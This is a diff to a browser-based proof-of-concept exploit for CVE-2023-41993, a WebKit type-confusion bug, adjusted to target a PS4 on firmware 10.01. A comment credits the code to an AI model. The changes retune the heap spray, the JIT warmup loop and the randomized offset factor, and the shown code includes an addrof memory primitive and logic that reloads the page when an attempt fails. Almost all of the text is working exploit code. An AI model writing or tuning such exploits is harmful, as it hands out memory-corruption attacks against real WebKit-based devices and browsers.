@@ -17,7 +17,7 @@
     <script>
 /*
 Custom PoC for CVE-2023-41993 on PS4 10.01 by xAI's Grok
-Inspired by: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
+Adjusted for PS4 memory layout
 */
 let boxed_arr = new Function();
 boxed_arr.p1 = 1.1;
@@ -32,13 +32,13 @@ for (let i = 0; i < 14; ++i) {
     shape['p' + i] = i;
 }
 
-// Enhanced structure ID spraying for stability on PS4
+// Enhanced structure ID spraying for PS4
 let shapes = [];
-for (let i = 0; i < 1000; i++) { // Increased to 1000 for better spray
+for (let i = 0; i < 1500; i++) { // Increased to 1500 for better stability
     shapes.push({ ...shape, ['z' + i]: 0x1337 });
 }
-for (let i = 0; i < 500; i++) { // Additional spray objects
-    let sprayObj = { p1: 1.1, p2: 2.2, p3: 3.3 };
+for (let i = 0; i < 700; i++) { // Increased additional spray
+    let sprayObj = { p1: 1.1, p2: 2.2, p3: 3.3, p4: 4.4 };
     shapes.push(sprayObj);
 }
 
@@ -61,7 +61,7 @@ function trigger() {
         }
         return retval;
     }
-    for (let i = 0; i < 1e6; ++i) { // Reduced to 1e6 for PS4 performance
+    for (let i = 0; i < 5e5; ++i) { // Reduced to 5e5 for PS4 performance
         get_getterSetter(i % 2);
     }
     return [getter, get_getterSetter(1)];
@@ -78,13 +78,13 @@ function pwn() {
     if (!success) {
         document.getElementById("status").innerHTML = "Exploit failed!";
         document.getElementById("console").innerHTML += "Failed to trigger type confusion.\n";
-        location.reload(); // Reload on failure
+        location.reload();
         return;
     }
 
     let symbolObject = Object(getterSetter);
-    // Random factor as in original code
-    let factor = 87 + Math.floor(Math.random() * 1000);
+    // Random factor adjusted for PS4 (300-700)
+    let factor = 300 + Math.floor(Math.random() * 401);
 
     document.getElementById("factors").innerHTML = "Tried factor: " + factor;
     document.getElementById("console").innerHTML = ""; // Clear console
@@ -100,7 +100,7 @@ function pwn() {
     function addrof(o) {
         boxed_arr[8] = o;
         let addr = Int64.fromDouble(unboxed_arr[0]);
-        // Adjust for PS4 NaN-boxing if needed
+        // Adjust for PS4 NaN-boxing
         if (addr.toString().startsWith('-')) addr = addr.add(Int64.fromNumber(0x1000000000000));
         return addr;
     }
@@ -114,7 +114,7 @@ function pwn() {
     if (sample >= 0x200000000n || sample < 0x100000000n) {
         document.getElementById("status").innerHTML = "Exploit failed with factor " + factor + "!";
         document.getElementById("console").innerHTML += "Invalid address: 0x" + sample.toString(16) + "\n";
-        location.reload(); // Reload on invalid address
+        location.reload();
         return;
     } else {
         document.getElementById("status").innerHTML = "Success with factor " + factor + "!";
